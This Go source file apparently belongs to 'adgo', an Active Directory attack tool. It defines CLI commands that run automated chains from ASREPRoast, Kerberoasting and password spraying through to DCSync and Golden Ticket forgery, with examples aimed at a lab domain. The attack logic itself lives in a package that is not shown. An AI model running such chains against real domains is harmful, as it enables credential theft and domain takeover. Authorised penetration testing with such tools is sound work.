// cmd/adgo/commands/attack.go
package commands

import (
	"adgo/pkg/attack"

	"github.com/spf13/cobra"
)

// AttackCmd commande d'attaques automatisées
var AttackCmd = &cobra.Command{
	Use:   "attack",
	Short: "Automated attack chains",
	Long: `Execute automated attack chains combining multiple techniques.

Available chains:
  asrep-chain    ASREPRoast → Crack → Kerberoast → DCSync → Golden Ticket
  spray-chain    Password Spray → Privilege Check → Escalate → DCSync

Example:
  adgo attack asrep-chain --users users.txt -d lab.local --dc-ip 192.168.1.10
  adgo attack spray-chain --users users.txt --passwords pass.txt -d lab.local --dc-ip 192.168.1.10`,
}

var asrepChainCmd = &cobra.Command{
	Use:   "asrep-chain",
	Short: "ASREPRoast → Crack → Kerberoast → DCSync → Golden Ticket",
	RunE:  runASREPChain,
}

var sprayChainCmd = &cobra.Command{
	Use:   "spray-chain",
	Short: "Password Spray → Privilege Escalation → DCSync",
	RunE:  runSprayChain,
}

func init() {
	// Flags pour asrep-chain
	asrepChainCmd.Flags().String("users", "", "File containing usernames")
	asrepChainCmd.Flags().String("domain", "", "Target domain (required)")
	asrepChainCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	asrepChainCmd.Flags().Bool("verbose", false, "Verbose output")
	asrepChainCmd.MarkFlagRequired("domain")
	asrepChainCmd.MarkFlagRequired("dc-ip")

	// Flags pour spray-chain
	sprayChainCmd.Flags().String("users", "", "File containing usernames (required)")
	sprayChainCmd.Flags().String("passwords", "", "File containing passwords (required)")
	sprayChainCmd.Flags().String("domain", "", "Target domain (required)")
	sprayChainCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	sprayChainCmd.Flags().Bool("verbose", false, "Verbose output")
	sprayChainCmd.Flags().Bool("auto-escalate", false, "Attempt automatic privilege escalation")
	sprayChainCmd.MarkFlagRequired("users")
	sprayChainCmd.MarkFlagRequired("passwords")
	sprayChainCmd.MarkFlagRequired("domain")
	sprayChainCmd.MarkFlagRequired("dc-ip")

	AttackCmd.AddCommand(asrepChainCmd)
	AttackCmd.AddCommand(sprayChainCmd)
}

func runASREPChain(cmd *cobra.Command, args []string) error {
	usersFile, _ := cmd.Flags().GetString("users")
	domain, _ := cmd.Flags().GetString("domain")
	dcIP, _ := cmd.Flags().GetString("dc-ip")
	verbose, _ := cmd.Flags().GetBool("verbose")

	cfg := &attack.ChainConfig{
		Domain:    domain,
		DCIP:      dcIP,
		UsersFile: usersFile,
		Verbose:   verbose,
	}

	chain := attack.ChainASREPToDCSync()
	return chain.Execute(cfg)
}

func runSprayChain(cmd *cobra.Command, args []string) error {
	usersFile, _ := cmd.Flags().GetString("users")
	passwordsFile, _ := cmd.Flags().GetString("passwords")
	domain, _ := cmd.Flags().GetString("domain")
	dcIP, _ := cmd.Flags().GetString("dc-ip")
	verbose, _ := cmd.Flags().GetBool("verbose")
	autoEscalate, _ := cmd.Flags().GetBool("auto-escalate")

	cfg := &attack.ChainConfig{
		Domain:        domain,
		DCIP:          dcIP,
		UsersFile:     usersFile,
		PasswordsFile: passwordsFile,
		Verbose:       verbose,
		AutoEscalate:  autoEscalate,
	}

	chain := attack.ChainSprayToDA()
	return chain.Execute(cfg)
}
